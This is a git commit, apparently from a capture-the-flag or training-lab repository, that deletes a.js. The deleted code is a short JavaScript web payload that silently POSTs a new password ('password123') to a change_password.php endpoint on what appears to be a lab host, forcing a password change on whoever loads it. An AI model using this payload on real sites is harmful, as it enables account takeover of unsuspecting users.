61659c1a70b17bf1b17470957bde9bc420a61e82
ispomael <ispomael@gmail.com>
2025-11-06 11:15:55 +0100

    Delete a.js

--- a.js
+++
@@ -1,5 +0,0 @@
-var xhr = new XMLHttpRequest();
-xhr.open('POST', 'http://login.worldwap.thm/change_password.php', true);
-xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
-xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-xhr.send('new_password=password123');
